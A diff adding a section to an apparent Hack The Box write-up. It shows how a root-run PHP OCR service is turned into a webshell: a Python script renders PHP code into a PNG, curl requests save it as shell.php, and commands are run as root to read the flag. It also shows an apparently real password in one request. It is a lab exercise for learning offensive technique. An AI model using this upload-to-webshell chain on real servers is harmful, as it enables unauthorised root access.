@@ -420,4 +420,58 @@ ssh -L 8001:127.0.0.1:8001 w*****@makesense.htb
 ```
 The internal service running on port 8001 is a PHP web application protected by HTTP Basic Authentication that provides an OCR interface powered by Tesseract. Users can draw text on an HTML canvas, which is then submitted as a base64-encoded PNG image, processed by Tesseract to extract the recognized text, and optionally saved to a file with a user-controlled filename.  
 
+<img src="img/no.png" width="800">  
 
+```
+curl -sk http://127.0.0.1:8001/saved/no.php                                                    
+NO
+```
+
+Seems pretty easy. The application allows saving the OCR output to a file with a fully user-controlled filename, including the extension. Since the service runs as root and saves files to a web-accessible directory, we can specify a .php extension and have the server execute our code directly.  
+We intercepted the legitimate requests with burp, so we know how to craft the malicious one.   
+Now let's create a .png file with the text of the simpliest webshell ever.
+```
+cat createfile.py                          
+from PIL import Image, ImageDraw, ImageFont
+import base64
+
+img = Image.new('RGB', (800, 100), color='white')
+draw = ImageDraw.Draw(img)
+font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 36)
+draw.text((10, 25), '<?php system($__GET["cmd"]); ?>', fill='black', font=font)
+img.save('payload.png')
+```
+When crafting the PNG image, we initially used <?php system($_GET["cmd"]); ?> as the payload, however Tesseract misread the single underscore in $_GET as a space, producing invalid PHP. To work around this, we used a double underscore $__GET which Tesseract correctly recognized as a single underscore _ resulting in valid executable PHP code.
+We just have to craft the requests:  
+```
+curl -sk \
+-c cookies.txt \
+-u w*****:<redacted> \
+-X POST http://localhost:8001 \
+--data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 payload.png) | grep ocr"
+               <input type="hidden" name="ocr_id" value="ocr_6a5278617ea0c4.38823827">
+```
+The flow is split into two steps: the first request submits the image to Tesseract for recognition and returns an ocr_id that identifies the result within the session, while the second request uses that ocr_id to save the recognized text to a file with a user-controlled filename.  
+
+```
+curl -sk \
+-b cookies.txt \
+-u walter:miapassword \
+-X POST http://localhost:8001 \
+-d "ocr_id=ocr_6a5278617ea0c4.38823827&filename=shell.php&save_output=shell.php"
+```
+Check if the webshell is working:  
+```
+curl -sk http://127.0.0.1:8001/saved/shell.php?cmd=id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+Next, grab the root flag:
+```
+curl -sk http://127.0.0.1:8001/saved/shell.php?cmd=cat%20/root/root.txt
+2********************************2
+
+```
+
+Cya
